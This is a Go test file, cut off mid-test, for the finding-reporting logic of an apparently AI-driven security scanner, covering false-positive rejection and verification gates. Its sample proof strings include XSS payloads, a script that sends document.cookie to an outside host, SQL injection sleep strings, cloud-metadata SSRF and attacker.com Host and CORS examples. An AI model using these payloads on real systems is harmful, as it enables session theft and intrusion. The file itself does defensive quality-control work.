package reporting

import (
	"strings"
	"sync"
	"testing"

	"github.com/xalgord/xalgorix/v4/internal/scanctx"
	"github.com/xalgord/xalgorix/v4/internal/tools"
)

func TestCheckFalsePositive_MissingHeaders(t *testing.T) {
	tests := []struct {
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		{"Missing X-Frame-Options Header", "The X-Frame-Options header is not set", "medium", "", true},
		{"Missing Content-Security-Policy", "CSP is not configured", "high", "", true},
		{"Missing HSTS Header", "Strict-Transport-Security not found", "critical", "", true},
		// Low/info severity should NOT be rejected for headers
		{"Missing X-Frame-Options Header", "Header not set", "info", "", false},
		{"Missing X-Frame-Options Header", "Header not set", "low", "", false},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)", tt.title, tt.severity, tt.wantReject, gotReject, result)
		}
	}
}

func TestCheckFalsePositive_UsernameEnumeration(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		{
			"differential auth responses at high → rejected",
			"Username Enumeration via Differential Auth Responses on Login",
			"The endpoint returns distinct error messages for existing vs non-existent accounts.",
			"high", "observed different JSON error for valid vs invalid username", true,
		},
		{
			"user enumeration medium without PII → rejected",
			"User Enumeration on /api/auth/login",
			"Observable response discrepancy reveals valid usernames.",
			"medium", "root, admin, support enumerated by response timing", true,
		},
		{
			"enumeration that leaks PII → allowed",
			"Account Enumeration exposing customer PII",
			"The lookup endpoint returns the account's full name, phone number, and home address.",
			"high", "enumerated account returned phone number and home address in the JSON body", false,
		},
		{
			"enumeration chained to account takeover → allowed",
			"Username Enumeration enabling account takeover",
			"Enumerated accounts combined with the reset flaw to reset another user's password.",
			"high", "used the valid username to trigger account takeover via the reset endpoint", false,
		},
		{
			"enumeration reported as info → not rejected",
			"Username Enumeration via Differential Error Responses",
			"Login reveals whether an account exists.",
			"info", "", false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("wantReject=%v gotReject=%v (msg=%s)", tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_HostHeaderInjection(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		{
			"bare host header injection at low → rejected",
			"Host Header Injection Nintendo Redirect Engine",
			"The Host header is reflected in the response.",
			"low", "changed Host header and it appeared in the redirect", true,
		},
		{
			"host header injection at medium no impact → rejected",
			"Host Header Injection on login",
			"Host header reflected into an absolute URL.",
			"medium", "sent evil.com as Host, saw it echoed", true,
		},
		{
			"host header → password reset poisoning → allowed",
			"Host Header Injection enabling password-reset poisoning",
			"The reset email link is built from the Host header.",
			"high", "set Host to attacker.com; the password reset link in the email pointed to attacker.com", false,
		},
		{
			"host header → cache poisoning → allowed",
			"Host Header Injection leads to web cache poisoning",
			"Response is cached with attacker Host.",
			"high", "poisoned the web cache so other users received the attacker host", false,
		},
		{
			"host header reported as info → not rejected",
			"Host Header Injection",
			"Host header reflected.",
			"info", "", false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("wantReject=%v gotReject=%v (msg=%s)", tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_VersionDisclosure(t *testing.T) {
	tests := []struct {
		title      string
		severity   string
		wantReject bool
	}{
		{"Server Version Disclosure - Apache 2.4.41", "medium", true},
		{"X-Powered-By Header Reveals Technology", "high", true},
		{"Technology Disclosure via banner", "critical", true},
		{"Server Version Disclosure", "info", false},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, tt.title, tt.severity, "")
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v", tt.title, tt.severity, tt.wantReject, gotReject)
		}
	}
}

func TestCheckFalsePositive_SSL(t *testing.T) {
	tests := []struct {
		title      string
		wantReject bool
	}{
		{"Weak SSL Cipher Suite", true},
		{"TLS 1.0 Enabled", true},
		{"Expired Certificate", true},
		{"POODLE Vulnerability", true},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, "", "medium", "")
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q: wantReject=%v gotReject=%v", tt.title, tt.wantReject, gotReject)
		}
	}
}

func TestCheckFalsePositive_DNS(t *testing.T) {
	tests := []struct {
		title      string
		wantReject bool
	}{
		{"Missing SPF Record", true},
		{"No DMARC Policy", true},
		{"DKIM Not Configured", true},
		{"Email Spoofing Possible via missing SPF", true},
	}

	for _, tt := range tests {
		result := checkFalsePositive(tt.title, "", "high", "")
		gotReject := result != ""
		if gotReject != tt.wantReject {
			t.Errorf("title=%q: wantReject=%v gotReject=%v (msg=%s)", tt.title, tt.wantReject, gotReject, result)
		}
	}
}

func TestCheckFalsePositive_CORSWithoutProof(t *testing.T) {
	// CORS without cookie/token theft proof → rejected at medium+
	result := checkFalsePositive("CORS Misconfiguration", "Access-Control-Allow-Origin reflects input", "high", "curl showed reflected origin")
	if result == "" {
		t.Error("CORS without exploit proof should be rejected at high severity")
	}

	// CORS WITH theft proof → accepted
	result = checkFalsePositive("CORS Misconfiguration", "Allows credential theft", "high", "JavaScript fetch() exfiltrates session cookie via CORS")
	if result != "" {
		t.Errorf("CORS with exploit proof should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_OpenRedirectWithoutChain(t *testing.T) {
	// Open redirect alone → rejected at medium+
	result := checkFalsePositive("Open Redirect", "Redirects to attacker URL", "medium", "curl -L shows redirect to evil.com")
	if result == "" {
		t.Error("open redirect without chain should be rejected at medium+")
	}

	// Open redirect chained with OAuth → accepted
	result = checkFalsePositive("Open Redirect to OAuth Token Theft", "Redirect steals OAuth token", "high", "OAuth code redirected via open redirect, token stolen via phishing")
	if result != "" {
		t.Errorf("open redirect with OAuth chain should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_XSSReflectionOnly(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// Reflection-only proof (payload echoed, no execution) → rejected at medium+.
		{
			"reflected payload only",
			"Reflected XSS in search parameter",
			"The q parameter is reflected in the response",
			"medium",
			"curl shows the payload reflected: <script>alert(1)</script> appears in the HTML body",
			true,
		},
		{
			"img onerror reflection only",
			"Reflected XSS",
			"Payload reflected in page",
			"high",
			"Response contained <img src=x onerror=alert(1)> in the body",
			true,
		},
		// Encoded reflection → output encoding works → rejected.
		{
			"encoded reflection",
			"Reflected XSS in name field",
			"name field reflects input",
			"medium",
			"The response shows &lt;script&gt;alert(1)&lt;/script&gt; in the page",
			true,
		},
		// Real execution proof → NOT rejected.
		{
			"execution via document.domain",
			"Reflected XSS in search",
			"q parameter executes",
			"medium",
			"browser_action execute_js confirmed alert(document.domain) fired showing the target origin in a dialog",
			false,
		},
		// Stored XSS with out-of-band callback → NOT rejected.
		{
			"stored xss with callback",
			"Stored XSS in support ticket",
			"Ticket description stored unsanitized",
			"high",
			"XSS Hunter callback received with admin session cookie when agent viewed the ticket; payload <script src=...></script> fired in admin panel",
			false,
		},
		// document.cookie execution proof → NOT rejected.
		{
			"document.cookie exfil proof",
			"Stored XSS in profile",
			"profile bio stored unsanitized",
			"high",
			"Payload <script>new Image().src='//x/?c='+document.cookie</script> fired and exfiltrated the session cookie",
			false,
		},
		// Browser verifier (verify_xss) confirmation, verbatim, alongside the
		// reflected payload the agent pastes → NOT rejected. This is the exact
		// shape that was wrongly dropped as reflection-only before the fix.
		{
			"browser-confirmed xss (dialog) not rejected",
			"Reflected XSS in q parameter (browser-confirmed execution)",
			"q parameter executes a script",
			"high",
			`Browser-confirmed XSS: a dialog:alert dialog carrying the nonce "XV-8f3a" fired while loading https://app.example.com/search?q=<script>alert('XV-8f3a')</script>. Recorded in the ledger.`,
			false,
		},
		{
			"browser-confirmed xss (console/dom marker) not rejected",
			"Reflected XSS (browser-confirmed)",
			"payload executes",
			"medium",
			`Browser-confirmed XSS: a console:log dialog carrying the nonce "XV-77" fired while loading https://app/x?p=<img src=x onerror=console.log('XV-77')>.`,
			false,
		},
		// Low/info severity → gate does not apply.
		{
			"reflection only but info severity",
			"Reflected input in search",
			"q parameter reflected",
			"info",
			"payload <script>alert(1)</script> reflected",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_S3CloudFrontTakeover(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: CloudFront origin returns NoSuchKey (bucket exists).
		{
			"cloudfront NoSuchKey is not takeover",
			"S3 Bucket Subdomain Takeover via CloudFront Distribution",
			"mta-sts subdomain CNAMEs to a CloudFront distribution with a dangling S3 origin",
			"critical",
			"dig CNAME shows d1uhex0.cloudfront.net; curl of the distribution returns <Code>NoSuchKey</Code> for key email.example.com/",
			true,
		},
		// CloudFront-fronted, only global-namespace NoSuchBucket, no claim → rejected.
		{
			"cloudfront NoSuchBucket without claim proof",
			"Subdomain Takeover via dangling CloudFront S3 origin",
			"CNAME to cloudfront.net, bucket does not exist",
			"high",
			"curl https://bucket.s3.amazonaws.com returns <Code>NoSuchBucket</Code>; the CloudFront origin is dangling",
			true,
		},
		// Genuine, claimed S3 takeover with canary → accepted.
		{
			"claimed s3 takeover with canary",
			"Subdomain Takeover of assets.example.com via dangling S3 website endpoint",
			"CNAME points directly to bucket.s3-website-us-east-1.amazonaws.com returning NoSuchBucket",
			"high",
			"Created the bucket and uploaded a benign canary; my content is now served over https://assets.example.com confirming takeover",
			false,
		},
		// Non-S3 takeover (GitHub Pages) is not touched by this gate.
		{
			"github pages takeover untouched",
			"Subdomain Takeover via GitHub Pages",
			"docs.example.com CNAMEs to org.github.io which is unclaimed",
			"high",
			"Response: There isn't a GitHub Pages site here. Claimed the repo and served a canary at docs.example.com",
			false,
		},
		// Info severity → gate does not apply.
		{
			"cloudfront nosuchkey but info severity",
			"Possible subdomain takeover via CloudFront",
			"mta-sts subdomain, NoSuchKey from distribution",
			"info",
			"NoSuchKey returned",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_TimeBasedSQLi(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// Single SLEEP measurement, no baseline → rejected.
		{
			"single sleep measurement",
			"Time-based blind SQL injection in id parameter",
			"The id parameter is injectable",
			"high",
			"Sent ' AND SLEEP(5)-- and the response took 5.2 seconds, confirming time-based blind SQLi.",
			true,
		},
		// Single SLEEP(10) — a lone high sleep value is still single-shot → rejected.
		{
			"single sleep10 measurement",
			"Time-based blind SQL injection",
			"id parameter injectable",
			"high",
			"Sent ' AND SLEEP(10)-- and the response took 10 seconds.",
			true,
		},
		// Differential timing with baseline → accepted.
		{
			"differential timing accepted",
			"Time-based blind SQL injection",
			"id parameter injectable",
			"high",
			"baseline 0.2s; SLEEP(0) 0.3s; SLEEP(5) 5.3s; SLEEP(10) 10.4s; repeated 3x, delay scales with sleep value",
			false,
		},
		// Hard confirmation (data extraction) → accepted even with timing words.
		{
			"data extraction accepted",
			"SQL injection in login",
			"union-based SQLi",
			"high",
			"sqlmap dumped users table via UNION SELECT from information_schema; response time noted",
			false,
		},
		// Error-based confirmation → accepted.
		{
			"error based accepted",
			"SQL injection in search",
			"error-based SQLi",
			"high",
			"Injecting a single quote returned: You have an error in your SQL syntax near '''",
			false,
		},
		// Info severity → gate does not apply.
		{
			"single sleep but info",
			"Possible time-based SQLi",
			"id parameter",
			"info",
			"' AND SLEEP(5)-- took 5 seconds",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_SSLScoping(t *testing.T) {
	// Config noise → still rejected.
	rejects := []string{
		"Weak SSL Cipher Suite",
		"TLS 1.0 Enabled",
		"Expired Certificate",
		"POODLE Vulnerability",
		"Self-signed certificate in use",
	}
	for _, title := range rejects {
		if checkFalsePositive(title, "", "medium", "") == "" {
			t.Errorf("title=%q: expected SSL/TLS config noise to be rejected", title)
		}
	}

	// Genuine TLS exploit mentioning "TLS"/"certificate" → NOT auto-rejected by this gate.
	keep := []struct{ title, desc, proof string }{
		{"Certificate validation bypass enables MITM", "App accepts any TLS certificate, allowing interception", "Presented a self-issued cert; app connected and leaked the bearer token"},
		{"mTLS client authentication bypass", "Mutual TLS auth can be bypassed by omitting the client cert", "Reached the protected admin API without a client certificate"},
	}
	for _, k := range keep {
		if r := checkFalsePositive(k.title, k.desc, "high", k.proof); r != "" {
			t.Errorf("title=%q: genuine TLS exploit should NOT be rejected by SSL gate, got: %s", k.title, r)
		}
	}
}

func TestCheckFalsePositive_CORSAliases(t *testing.T) {
	// Alternate phrasing without the literal "cors" should still be gated.
	result := checkFalsePositive(
		"Access-Control-Allow-Origin reflects arbitrary origin",
		"ACAO header reflects any Origin with credentials enabled",
		"high",
		"curl with Origin: https://evil.com is reflected in Access-Control-Allow-Origin",
	)
	if result == "" {
		t.Error("CORS finding phrased via ACAO (no 'cors' literal) should still be rejected without theft proof")
	}

	// With credential-theft proof → accepted.
	result = checkFalsePositive(
		"Access-Control-Allow-Origin misconfiguration",
		"ACAO reflects origin with credentials",
		"high",
		"PoC fetch() with credentials exfiltrates the session cookie cross-origin to attacker.com",
	)
	if result != "" {
		t.Errorf("ACAO with credential-theft PoC should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_MethodEnforcementBypass(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: status-codes-only "method bypass".
		{
			"status-codes-only method bypass",
			"Broken Access Control on /auth Endpoint - Method Enforcement Bypass",
			"The /auth endpoint only enforces auth for GET; POST, PUT, PATCH, DELETE, OPTIONS, HEAD return 200 without credentials.",
			"high",
			"GET /auth: 401 (blocked); POST /auth: 200 (VULNERABLE); PUT 200; PATCH 200; DELETE 200; OPTIONS 200; HEAD 200",
			true,
		},
		// Same but with proven state change → accepted.
		{
			"method bypass with state change",
			"Broken Access Control - unauthenticated DELETE",
			"DELETE on /api/users/123 works without auth",
			"high",
			"Unauthenticated DELETE /api/users/123 returned 200 and the user record was deleted; re-fetch returns 404",
			false,
		},
		// Method-based finding where data was returned → accepted.
		{
			"method bypass returning data",
			"Access control bypass via POST method",
			"POST returns data that GET blocks",
			"high",
			"POST /account returned another user's PII in the JSON body: email victim@example.com, balance $4,200",
			false,
		},
		// Info severity → gate does not apply.
		{
			"method bypass info severity",
			"Method enforcement inconsistency on /auth",
			"non-GET methods return 200",
			"info",
			"POST 200, PUT 200, empty body",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_ClientSideSSRF(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: client-side URL-param handling labeled SSRF.
		{
			"client-side mislabeled as ssrf",
			"Server-Side Request Forgery (SSRF) via graphqlUrl Parameter - Token Theft",
			"The embeddable dashboard processes URL parameters client-side in dashboards.bundle.js and uses graphqlUrl to configure requests from the browser.",
			"critical",
			"From bundle.js: window.location.search is parsed; the browser sends a Bearer token to the attacker-supplied graphqlUrl. Attacker captures the token they put in the URL.",
			true,
		},
		// Genuine SSRF with out-of-band callback → accepted.
		{
			"real ssrf with callback",
			"SSRF in webhook URL parameter",
			"The server fetches a user-supplied URL",
			"high",
			"Set param to http://interact.sh subdomain; callback received at the collaborator server from the target's IP, confirming server-side request.",
			false,
		},
		// Genuine SSRF reaching cloud metadata → accepted.
		{
			"real ssrf metadata",
			"SSRF to cloud metadata",
			"server-side fetch of attacker URL",
			"high",
			"Param set to http://169.254.169.254/latest/meta-data/ returned the IAM role credentials in the response body",
			false,
		},
		// Info severity → gate does not apply.
		{
			"client-side ssrf info",
			"Possible SSRF via url parameter",
			"browser reads url param",
			"info",
			"client-side fetch from window.location",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestReportVuln_IndependentVerifierGate(t *testing.T) {
	base := func() map[string]string {
		m := validReportArgs()
		return m
	}

	t.Run("confirmed persists and marks verified", func(t *testing.T) {
		ctx := "verifier-confirm"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Confirmed: true, Reason: "reproduced", Evidence: "dumped rows again"}
		})

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if _, ok := res.Metadata["vuln_id"]; !ok {
			t.Fatalf("expected vuln stored, got: %s", res.Output)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 || !vulns[0].Verified {
			t.Fatalf("expected 1 verified vuln, got %d (verified=%v)", len(vulns), len(vulns) == 1 && vulns[0].Verified)
		}
		if !containsTag(vulns[0].Tags, TagVerified) {
			t.Fatalf("expected TagVerified on a confirmed finding, got tags=%v", vulns[0].Tags)
		}
	})

	t.Run("rejected drops the finding", func(t *testing.T) {
		ctx := "verifier-reject"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Confirmed: false, Reason: "could not reproduce — by design"}
		})

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if !strings.Contains(res.Output, "REJECTED by independent verifier") {
			t.Fatalf("expected verifier rejection, got: %s", res.Output)
		}
		if got := len(GetVulnerabilitiesForContext(ctx)); got != 0 {
			t.Fatalf("expected 0 vulns after verifier rejection, got %d", got)
		}
	})

	t.Run("low severity is also independently verified (rejection drops it)", func(t *testing.T) {
		// Regression: low findings previously skipped the independent verifier
		// (only medium+ was gated). A low claim is still a claim, so it must be
		// re-tested too — only 'info' is exempt.
		ctx := "verifier-low"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		called := false
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			called = true
			return VerificationVerdict{Confirmed: false, Reason: "could not reproduce"}
		})
		low := map[string]string{
			"title":               "Verbose error discloses stack trace",
			"severity":            "low",
			"description":         "An unhandled error returns a full stack trace including internal file paths and framework version.",
			"exploitation_proof":  "sent a malformed id and the endpoint returned HTTP 500 with a full stack trace in the body, including internal file paths and the framework version",
			"verification_method": "error_based",
			"target":              "https://example.com",
			"endpoint":            "https://example.com/api/item?id=x",
			"method":              "GET",
			"cvss":                "3.1",
		}
		res, err := reportVulnWithContextID(ctx, low)
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		if !called {
			t.Fatalf("verifier was NOT invoked for a low-severity finding — it must be")
		}
		if !strings.Contains(res.Output, "REJECTED by independent verifier") {
			t.Fatalf("expected verifier rejection for low finding, got: %s", res.Output)
		}
		if got := len(GetVulnerabilitiesForContext(ctx)); got != 0 {
			t.Fatalf("expected 0 vulns after low verifier rejection, got %d", got)
		}
	})

	t.Run("info severity is exempt from the verifier", func(t *testing.T) {
		ctx := "verifier-info"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		called := false
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			called = true
			return VerificationVerdict{Confirmed: false, Reason: "should not run for info"}
		})
		info := map[string]string{
			"title":               "Server version disclosed in response header",
			"severity":            "info",
			"description":         "The server responds with a Server header revealing the exact software version.",
			"verification_method": "manual_verified",
			"target":              "https://example.com",
			"endpoint":            "https://example.com/",
			"method":              "GET",
			"cvss":                "0.0",
		}
		if _, err := reportVulnWithContextID(ctx, info); err != nil {
			t.Fatalf("report error: %v", err)
		}
		if called {
			t.Fatalf("verifier ran for an info finding — info must remain exempt")
		}
	})

	t.Run("inconclusive with concrete first-party proof is EXPLOIT-PROVEN", func(t *testing.T) {
		// The verifier could not re-confirm (ran out of turn/time budget or hit
		// an LLM error), but the agent's own proof shows a CONCRETE exploitation
		// outcome (data extraction / dumped rows). This is proven by its own
		// evidence — not a guess — so it must NOT be buried under "manual
		// verification needed". It's preserved, marked Verified, and tagged
		// exploit-proven. base() carries concrete-impact proof.
		ctx := "verifier-inconclusive-strong"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Inconclusive: true, Reason: "verifier did not reach a verdict within the turn budget"}
		})

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 {
			t.Fatalf("expected 1 vuln preserved on concrete-proof inconclusive, got %d (%s)", len(vulns), res.Output)
		}
		if !vulns[0].Verified {
			t.Fatalf("concrete-proof inconclusive finding MUST be marked Verified (exploit-proven)")
		}
		if !containsTag(vulns[0].Tags, TagExploitProven) {
			t.Fatalf("expected TagExploitProven on a concrete-proof inconclusive finding, got tags=%v", vulns[0].Tags)
		}
		if containsTag(vulns[0].Tags, TagManualReview) {
			t.Fatalf("exploit-proven finding must NOT also carry TagManualReview, got tags=%v", vulns[0].Tags)
		}
		if !strings.Contains(res.Output, "RECORDED as EXPLOIT-PROVEN") {
			t.Fatalf("expected 'RECORDED as EXPLOIT-PROVEN' notice, got: %s", res.Output)
		}
	})

	t.Run("inconclusive with weak proof is KEPT and flagged for manual verification", func(t *testing.T) {
		// Product decision: never silently drop an inconclusive finding — the
		// operator reviews it. It is preserved, marked Unverified, and tagged
		// needs-manual-verification (NOT dropped as a false positive).
		ctx := "verifier-inconclusive-weak"
		CleanupContext(ctx)
		defer CleanupContext(ctx)
		SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
			return VerificationVerdict{Inconclusive: true, Reason: "could not reproduce"}
		})

		weak := map[string]string{
			"title":               "Business logic flaw in cart quantity handling",
			"severity":            "medium",
			"description":         "The checkout endpoint accepts a negative quantity without rejecting the request.",
			"exploitation_proof":  "sent a negative quantity value and the endpoint returned HTTP 200 accepting the request",
			"verification_method": "exploited",
			"impact":              "Potential mispricing of an order.",
			"target":              "https://example.com",
			"endpoint":            "https://example.com/checkout",
			"method":              "POST",
			"cvss":                "5.3",
			"cvss_vector":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
		}
		res, err := reportVulnWithContextID(ctx, weak)
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 {
			t.Fatalf("expected 1 vuln preserved on weak-evidence inconclusive, got %d (%s)", len(vulns), res.Output)
		}
		if vulns[0].Verified {
			t.Fatalf("inconclusive finding must NOT be marked Verified")
		}
		if !containsTag(vulns[0].Tags, TagManualReview) {
			t.Fatalf("expected TagManualReview, got tags=%v", vulns[0].Tags)
		}
		if !strings.Contains(res.Output, "RECORDED as UNVERIFIED") {
			t.Fatalf("expected 'RECORDED as UNVERIFIED' notice, got: %s", res.Output)
		}
	})

	t.Run("no verifier falls back to heuristic verified flag", func(t *testing.T) {
		ctx := "verifier-absent"
		CleanupContext(ctx) // ensure no verifier registered for this context
		defer CleanupContext(ctx)

		res, err := reportVulnWithContextID(ctx, base())
		if err != nil {
			t.Fatalf("report error: %v", err)
		}
		vulns := GetVulnerabilitiesForContext(ctx)
		if len(vulns) != 1 || !vulns[0].Verified {
			t.Fatalf("expected 1 vuln verified by heuristic fallback, got %d (%s)", len(vulns), res.Output)
		}
	})
}

func TestRegistryLocalVerifiersDoNotCrossWire(t *testing.T) {
	ctx := "registry-local-verifier-isolation"
	CleanupContext(ctx)
	defer CleanupContext(ctx)

	// A legacy context callback must not be consulted when an agent-local
	// verifier was bound to the reporting tool.
	SetFindingVerifier(ctx, func(VerificationRequest) VerificationVerdict {
		t.Fatal("context-global verifier was called instead of registry-local verifier")
		return VerificationVerdict{Inconclusive: true}
	})

	registryA := tools.NewRegistry()
	registryA.SetScanContextID(ctx)
	registryB := tools.NewRegistry()
	registryB.SetScanContextID(ctx)

	var callsA, callsB int
	RegisterWithVerifier(registryA, func(VerificationRequest) VerificationVerdict {
		callsA++
		return VerificationVerdict{Confirmed: true, Reason: "agent A reproduced it"}
	})
	RegisterWithVerifier(registryB, func(VerificationRequest) VerificationVerdict {
		callsB++
		return VerificationVerdict{Reason: "agent B disproved it"}
	})

	argsA := validReportArgs()
	argsA["title"] = "Agent A SQL injection"
	argsA["endpoint"] = "https://example.com/api/a?id=1"
	argsB := validReportArgs()
	argsB["title"] = "Agent B SQL injection"
	argsB["endpoint"] = "https://example.com/api/b?id=1"

	resultA, err := registryA.Execute("report_vulnerability", argsA)
	if err != nil {
		t.Fatal(err)
	}
	resultB, err := registryB.Execute("report_vulnerability", argsB)
	if err != nil {
		t.Fatal(err)
	}
	if callsA != 1 || callsB != 1 {
		t.Fatalf("local verifier calls = A:%d B:%d, want 1 each", callsA, callsB)
	}
	if _, ok := resultA.Metadata["vuln_id"]; !ok {
		t.Fatalf("agent A finding was not persisted: %s", resultA.Output)
	}
	if !strings.Contains(resultB.Output, "REJECTED by independent verifier") {
		t.Fatalf("agent B's rejecting verifier was not honored: %s", resultB.Output)
	}
}

func TestCheckClaimConsistency(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		cwe        string
		method     string
		vector     string
		severity   string
		proof      string
		wantReject bool
	}{
		// SSRF + 'reflected' method with NO hard evidence → reject (check #1).
		{
			"ssrf reflected no evidence",
			"SSRF via parameter", "CWE-918", "reflected", "",
			"high", "the parameter value appears in the response", true,
		},
		// SSRF with OOB callback → accepted (callback_received, not reflected).
		{
			"ssrf with callback",
			"SSRF in webhook", "CWE-918", "callback_received", "",
			"high", "interact.sh callback received from the target server", false,
		},
		// SSRF labeled reflected BUT proof shows internal access → not dropped (real finding).
		{
			"ssrf reflected but internal hit",
			"SSRF in url param", "CWE-918", "reflected", "",
			"high", "the server connected to internal host 10.0.0.5 and returned the admin panel", false,
		},
		// 'reflected' method for a hard class (CWE-89) → reject.
		{
			"reflected method for sqli",
			"SQL Injection", "CWE-89", "reflected", "",
			"high", "the input is reflected in the response", true,
		},
		// CVSS I:H without state change → reject.
		{
			"integrity high no state change",
			"Broken access control", "CWE-284", "manual_verified",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
			"high", "POST returned 200 with empty body", true,
		},
		// CVSS A:H is not justified by an arbitrary read, even when the read
		// exposes sensitive credentials.
		{
			"availability high on file read",
			"Path traversal", "CWE-22", "data_extracted",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
			"critical", "retrieved /etc/passwd and a database containing password hashes", true,
		},
		// Proven code execution inherently permits an availability impact.
		{
			"availability high with rce",
			"Remote code execution", "CWE-78", "exploited",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			"critical", "command execution returned uid=33(www-data)", false,
		},
		// CVSS C:H without data obtained → reject.
		{
			"confidentiality high no data",
			"Information exposure", "CWE-200", "manual_verified",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			"high", "the endpoint returned a 200 response", true,
		},
		// CVSS C:H WITH extracted data → accepted.
		{
			"confidentiality high with data",
			"SQL injection", "CWE-89", "data_extracted",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			"high", "dumped users table via union select from information_schema", false,
		},
		// Error-based SQLi: C:H proven by a reflected DBMS error, no data dumped
		// → accepted. A provoked SQL syntax error proves an exploitable injection
		// point, which is confidentiality-impacting even without extraction.
		{
			"error-based sqli c:h via dbms error",
			"SQL injection", "CWE-89", "manual_verified",
